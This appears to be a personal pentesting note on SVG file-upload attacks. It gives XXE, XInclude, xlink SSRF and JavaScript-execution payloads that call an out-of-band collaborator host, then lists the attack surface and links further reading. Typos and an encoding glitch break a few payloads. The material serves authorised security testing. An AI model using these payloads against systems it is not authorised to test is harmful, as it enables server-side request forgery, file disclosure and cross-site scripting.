---
layout: note
title: "File Upload Exploits"
category: Web security
tag: [Web security, Note]
---

# File Upload Exploits

## SVG

Beware that SVGs can be imported from many other formats!

Remember to include namespaces:  
```xml
<svg width="255px" height="255px" xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude"
  xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:xhtml="http://www.w3.org/1999/xhtml"  version="1.1">
</svg>
```

### Testing guide

#### Check for XXE
```javascript
<!DOCTYPE svg [ <!ENTITY ext PUBLIC "http://burpcollaborator.net/"> ]>
```
```javascript
<!DOCTYPE svg [
  <!ENTITY % init SYSTEM "data://text/plain;base64,aHR0cDovL2l4anBvYXo3YXZnZTVhN3g0ZmYxaTZ5anZhMTFwcS5idXJwY29sbGFib3JhdG9yLm5ldC8=">
%init; ]>
```

#### Check for XInclude attacks
```xml
<xi:include parse="text" href="htpp://burpcollaborator.net/"/>
```

#### Test wether the server will try to load xlinked hrefs:
```xml
<image href="http://burpcollaborator.net/" height="55" width="55"/>
```
If this works it might be of interest to check whether you could at least display some html:
```xml
<foreignObject x="20" y="20" width="160" height="160">
  <div xmlns="http://www.w3.org/1999/xhtml">
    Lorem ipsum dolor sit amet, consectetur adipiscing elit.
    Sed mollis mollis mi ut ultricies. Nullam magna ipsum,
    porta vel dui convallis, rutrum imperdiet eros. Aliquam
    erat volutpat.
  </div>
</foreignObject> -->
```
And other ways to display text:
```xml
<tref xlink:href="http://burpcollaborator.net/text.txt"/>
```

#### Test for javascript execution
```xml
<handler xmlns:ev="http://www.w3.org/2001/xmlÂ­-events" ev:event="load">
  var xhr = new XMLHttpRequest(); xhr.open("GET", "http://burpcollaborator.net/"); xhr.send();
</handler>
```
```xml
<circle cx="50" cy="50" r="45" fill="green" id="foo"
  onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
```

### Attack surface
- **SSRF**
- **XSS** on the behalf of the server - might exist a better terminology for this
- **XXE**

### Resources
[Blackhat old exploits for browsers](https://www.blackhat.com/docs/us-14/materials/us-14-DeGraaf-SVG-Exploiting-Browsers-Without-Image-Parsing-Bugs.pdf)  
[Fingerprinting libraries with blind SVG XLINK SSRF](https://medium.com/@arbazhussain/svg-xlink-ssrf-fingerprinting-libraries-version-450ebecc2f3c)
